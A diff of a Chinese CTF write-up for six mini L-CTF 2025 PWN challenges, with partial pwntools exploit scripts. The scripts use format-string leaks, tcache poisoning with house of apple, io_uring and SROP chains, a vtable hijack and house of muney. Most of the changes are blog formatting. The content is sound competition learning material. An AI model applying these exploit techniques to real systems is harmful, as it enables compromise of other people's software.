@@ -1,14 +1,28 @@
-# mini L-CTF2025-wing-WP
+---
+title: miniLCTF2025-WP
+date: 2025-05-08 00:00:00
+tags: [PWN]
+categories: writeup
+top_img: /images/miniLCTF2025-WP/top.jpg
+cover: /images/miniLCTF2025-WP/top.jpg
+---
+
+# miniLCTF2025--WP
+
 本次mini L-CTF2025 本人一共打出6道题
+
 ## PWN
+
 ### Ex-Aid lv.2
+
 一道shellcode题，禁了一些基础的系统调用
-![seccomp](images/Ex-Aid-lv.2-seccomp.png)
+![seccomp](/images/miniLCTF2025-WP/Ex-Aid-lv.2-seccomp.png)
 题目从堆上申请3个连续的，0x20大小的chunk
-![chunk](images\Ex-Aid-lv.2.png)
+![chunk](/images/miniLCTF2025-WP/Ex-Aid-lv.2.png)
 然后mprotect,最后call
 
 我们打一个open+sendfile链,通过jmp $+0xa跳过不可控区域
+
 ```python
 from pwn import *
 
@@ -53,20 +67,23 @@ def exp():
 if __name__ == '__main__':
     exp()
 ```
+
 ### PostBox
+
 一道由格式化字符串漏洞引发的栈溢出
 
 题目PostScript函数要求v4==114514，v4是一个未初始化的int变量，距离rbp-114h
-![v4](images\PostBox-v4.png)
+![v4](/images/miniLCTF2025-WP/PostBox-v4.png)
 可以通过PostMessage函数控制buf，距离rbp-0x410h
-![buf](images\PostBox-buf.png)
+![buf](/images/miniLCTF2025-WP/PostBox-buf.png)
 通过Options->General打开Stack pointer，在Postbox函数中发现偏移一致，说明PostScript函数与PostMessage函数rbp数值一致
-![stack-pointer](images\PostBox-Stack-pointer.png)
+![stack-pointer](/images/miniLCTF2025-WP/PostBox-Stack-pointer.png)
 由此控制v4
-![push](images\PostBox-push.png)
+![push](/images/miniLCTF2025-WP/PostBox-push.png)
 每个函数开头为了保存函数的参数，会将参数压栈，这里是sub和mov构成的逻辑压栈.
-![bug](images\PostBox-bug.png)
+![bug](/images/miniLCTF2025-WP/PostBox-bug.png)
 该函数两个参数分别是write_time_pointer和write_len_pointer，由此我们便可以通过格式化字符串漏洞篡改write_time和write_len，并泄露canary、rbp、ret_addr。最后返回到backdoor
+
 ```python
 from pwn import *
 
@@ -82,7 +99,7 @@ def exp():
 
     pl = b'%2c%7$n%1021c%6$n-%43$p-%44$p-%45$p-'
     p.sendafter(b'contents:\n\n',pl)
-    
+
     p.recvuntil(b'-')
     canary = int(p.recvuntil(b'-',drop=True),16)
     rbp = int(p.recvuntil(b'-',drop=True),16)
@@ -105,13 +122,16 @@ def exp():
 if __name__ == '__main__':
     exp()
 ```
+
 ### EasyHeap
+
 一道菜单堆，使用fgets进行chunk的编辑，会在末尾置\0，add中必须输入内容，无法利用残留指针进行leak，Delete中没有对结构体数组中的指针清空，且没有大小的检查，但是会把大小清空，Edit会依照大小进行输入长度限制，Show要求大小不为零才能输出。故本题可利用的漏洞只有free after free。我们可以进行常规的伪造堆块进行chunk overlap。通过tcache poison打 house of apple。
 
-![EasyHeap-seccomp](images\EasyHeap-seccomp.png)
+![EasyHeap-seccomp](/images/miniLCTF2025-WP/EasyHeap-seccomp.png)
 本题通过沙盒禁了open和openat，于是也没法打开/bin/sh文件getshell了，我们走svcudp_reply，swapcontext，mprotect，io_uring链获取flag。
 
 似乎本题预期解是通过openat2打开flag文件，但我当时打比赛的时候并不知道有这么个东西，只能从网上找了一个io_uring的模板来~~力大砖飞~~get flag了。
+
 ```python
 from pwn import *
 
@@ -158,9 +178,9 @@ def init():
         add(0,0xe0,b'a')
 
 def exp():
-    
+
     init()
-    
+
     #step 1 chunk overlap
     #get a fake_chunk ptr
     for i in range(10):
@@ -192,13 +212,13 @@ def exp():
     show(8)
     p.recvuntil(b'Data: ')
     libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x203b20
-    
+
     add(20,0x20,b'a')
     delete(20)
     show(8)
     p.recvuntil(b'Data: ')
     heap_base = (u64(p.recv(5).ljust(8,b'\x00')) << 12) - 0x2000
-    
+
     #step3 modify _IO_list_all to fake_file
     IO_list_all = libc.sym['_IO_list_all']
     IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
@@ -219,14 +239,14 @@ def exp():
     pl += p64(0) + p64(0x51)
     add(22,0x80,pl)
     delete(9)
-    
+
     pl = p64(0) + p64(0x31)
     pl += p64(((heap_base+0x2000)>>12)^IO_list_all)
     edit(22,pl)
-    
+
     add(23,0x20,b'a')
     add(24,0x20,p64(fake_file_addr))
-    
+
     file = FileStructure()
     file.flags = b'  sh'
     file._IO_write_ptr = 1
@@ -235,7 +255,7 @@ def exp():
     file._lock = lock
     file._wide_data = fake_file_addr + 0xe0
     file.vtable = IO_wfile_jumps
-    
+
     pl = flat({
             0:{0:bytes(file),
                 0xe0:{
@@ -411,14 +431,17 @@ def exp():
 if __name__ == '__main__':
     exp()
 ```
+
 ### CTFers
+
 一道c++虚表利用题，我们可以通过bug篡改ctfer表第一项使其指向我们可控的name_buf处，并在name_buf处伪造一个CTFer结构体，结构体大概如下
-![struct-CTFer](images\CTFers-struct.png)
+![struct-CTFer](/images/miniLCTF2025-WP/CTFers-struct.png)
 第一次我们伪造结构体使name指向got表，name_len为8，以leak libc_base，第二次我们伪造vtable，并找一个gadget以控制rdx来进行SROP，然后execve
 
 找到gadget如下
-![gadget](images\CTFers-gadget.png)
-由于c++的char_traits模板在接收到空白字符后便会停止接收，而我们的gadget低一位正好是一个0x20，即空格，需要减去2，影响不大。
+![gadget](/images/miniLCTF2025-WP/CTFers-gadget.png)
+字符串的格式化输入操作 operator>> 默认将空白字符作为分隔符。目标 gadget 地址的低字节恰好为 0x20，因此无法通过当前输入方式直接写入。这里改用偏移为 -2 的入口，会多两个零字节，即`add [rax], al`，这里rax已经是一个可写地址的指针了，不会崩溃。
+
 ```python
 from pwn import *
 
@@ -443,7 +466,7 @@ def bug(num):
 
 def exp():
     name_buf = 0x4092e0
-    
+
     #step1 forge a fake_ctfers to leak libc_base
     join(b'a')
     pl = p64(0x408c98) #vtable
@@ -466,9 +489,9 @@ def exp():
     svcudp_reply = libc.address + 0x16a050
     swapcontext = libc.address + 0x53e00
     setcontext = libc.address + 0x539e0
-    
+
     pl = b'\x00'*0x81
-    #pl += p64(100) 
+    #pl += p64(100)
     #pl += p64(binsh)
     #pl += p64(8)
     join(pl)
@@ -487,7 +510,7 @@ def exp():
             0x30: bytes(frame)[0x30::]
             },filler=b'\x00')
     join(pl)
-    
+
     show()
 
     log.success('libc_base:'+hex(libc.address))
@@ -499,12 +522,15 @@ def exp():
 if __name__ == '__main__':
     exp()
 ```
+
 ### MiniSnake
+
 一个贪吃蛇小游戏，给了一个随机数模式和全＃号模式，随机数的种子可以是随机的或者自己输入。程序漏洞在于hit wall和get point的处理在同一个线程上，导致get point和hit wall无法同时发生。我们可以在边界上get points以穿墙。栈中布局如下
-![stack](images\MiniSnake-stack.png)
+![stack](/images/miniLCTF2025-WP/MiniSnake-stack.png)
 其中上16行是墙内，下面分别是遗留数据，canary，rbp，ret_addr。那么思路显而易见便是，在下方左侧8格穿墙（绕过canary），将随机出来的蛇身(backdoor)置于ret处，就可以getshell。
 
 接下来的问题便是怎么获取一个可以用于返回到backdoor处的随机数，由于给了源码，我们可以从源码中修修剪剪出来一个爆破脚本。
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -613,30 +639,33 @@ int main(void) {
     return 0;
 }
 ```
+
 结果如下
-![seed](images\MiniSnake-seed.png)
+![seed](/images/miniLCTF2025-WP/MiniSnake-seed.png)
 发现7282606比较合适，之前展示的栈中布局便是由该种子生成的布局，我们在下方的0x31处穿墙，在y=17时右转，在x=10时退出即可返回到backdoor。
+
 ### MmapHeap
+
 一道很有特色的堆题，依赖库是出题人自己写的mylib，里面实现了一些自己写的函数。
-![struct](images\Mmapheap-struct.png)
+![struct](/images/miniLCTF2025-WP/Mmapheap-struct.png)
 本题的堆管理器有两个结构体，暂且叫他们segment_arena和chunk。
-![malloc](images\Mmapheap-fetch.png)
+![malloc](/images/miniLCTF2025-WP/Mmapheap-fetch.png)
 malloc函数中，通过大循环遍历segment_arena中的fd和bk形成的连接各mmap到的内存段的双向链表，通过小循环遍历由chunk_link_list形成的chunk的单向链表。
-![check](images\Mmapheap-check.png)
+![check](/images/miniLCTF2025-WP/Mmapheap-check.png)
 通过chk_chunk_size对chunk_size进行检查。检查只要求in_use位不为零，且size大于0x10，即chunk最小为0x20，不是很严格，允许size位极其巨大。
 
 只要chunk_size大于等于请求size且in_use位为零就算查找成功，然后再通过fetch对chunk进行切分。查找失败再去申请新的内存段。
-![new-node](images\Mmapheap-newnode.png)
+![new-node](/images/miniLCTF2025-WP/Mmapheap-newnode.png)
 新的内存段会在开头设置一个segment_arena。
-![free](images\Mmapheap-free.png)
+![free](/images/miniLCTF2025-WP/Mmapheap-free.png)
 Free会寻找该chunk所处的内存段，并将其插入到chunk_link_list的开头(后进先出)。如果为chunk_num为零，则把该内存段munmap。没有chunk合并。
-![freenode](images\Mmapheap-freenode.png)
+![freenode](/images/miniLCTF2025-WP/Mmapheap-freenode.png)
 munmap长度由end和base计算而来。
 
 整体看下来并没有在mylib中发现什么明显漏洞。
-![bug](images\Mmapheap-bug.png)
+![bug](/images/miniLCTF2025-WP/Mmapheap-bug.png)
 vuln中存在一个off by null漏洞。
-![goal](images\Mmapheap-goal.png)
+![goal](/images/miniLCTF2025-WP/Mmapheap-goal.png)
 最终目的是要把f_open解析到r_open。
 
 利用mmap的特性，我们可以利用off by null冲掉segment_arena的chunk_link_list的低一字节，使chunk_link_list指向segment_arena，进而达成任意地址写。然后打house of muney。
@@ -647,7 +676,8 @@ house of muney是一种针对重定向机制的攻击，通过伪造哈希表，
 1.解析一些必要的函数  
 2.利用off by null达成任意地址写，并leak mylib_base  
 3.篡改segment_end，使free_node_header的时候将mylib的LOAD段~~一把抓住，顷刻炼化~~munmap掉  
-4.伪造哈希表，符号表和字符串表，将f_open解析至r_open。  
+4.伪造哈希表，符号表和字符串表，将f_open解析至r_open。
+
 ```python
 from pwn import *
 
@@ -692,24 +722,24 @@ def exp():
         add(i,0x10,b'b')#idx0 to 3
     add(4,0xff50,b'new mmap')
     add(5,0xff40,b'fill old mmap')
-    
+
     delete(0)#modify old_mmap_arena_list to idx0
     pl = b'\x00'*0x50 + p64(0x80) + p64(0) # a fake_chunk
     add(6,0x60,pl)#modify old_mmap_arena_list to old_mmap_arena
-    
+
     add(7,0x90,b'\x00')#overlap chunk
 
     #step3 leak mylib_base
     show(3)
     mylib_base = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00')) + 0xa0 + 0x10000
-    
+
     #step4 munmap mylib's relocate table
     delete(1)
     pl = p64(mylib_base- 0x10000) + p64(mylib_base + 0x1000)
-    pl += p64(mylib_base - 0x20000) + p64(mylib_base + 0x4020) 
+    pl += p64(mylib_base - 0x20000) + p64(mylib_base + 0x4020)
     pl += p64(0x20) + p64(0)*3 + p64(0x20) + p64(mylib_base - 0x10010)
     edit(7,pl)
-    
+
     pl = p64(mylib_base - 0x10000 + 0x50) + p64(1)
     add(8,0x70,pl)
     delete(2)#trigger attack!
@@ -717,7 +747,7 @@ def exp():
     #step5 house of muney
     add(0,0x10,b'test')
     add(1,0xef90,b'pad')#now mmap_top_size==0x1010
-    
+
     gnu_hash_section = mylib.get_section_by_name('.gnu.hash')
     dynsym_section = mylib.get_section_by_name('.dynsym')
     dynstr_section = mylib.get_section_by_name('.dynstr')
@@ -740,7 +770,7 @@ def exp():
     sym_value += p16(1) # st_shndx
     sym_value += p64(0x139b) # st_value,r_open
     sym_value += p64(8) # st_size
-    
+
     pl = flat({
         bloom_elem_off:p64(bloom_elem_val),
         bucket_elem_off:p32(bucket_elem_val),
@@ -754,7 +784,7 @@ def exp():
     log.success('hasharr_off:'+hex(hasharr_off))
     log.success('sym_off:'+hex(sym_off))
     log.success('mylibc_base:'+hex(mylib_base))
-    
+
     add(2,0x1000,pl)
 
     load(b'/flag',1)
@@ -768,4 +798,5 @@ if __name__ == '__main__':
 ```
 
 ## 后记
+
 本次miniLCTF是我第一次在这么知名的队伍的比赛上实现PWN单方向AK。整体感觉题目难度不低，十分新颖，非常具有价值。故略写WP以作纪念。
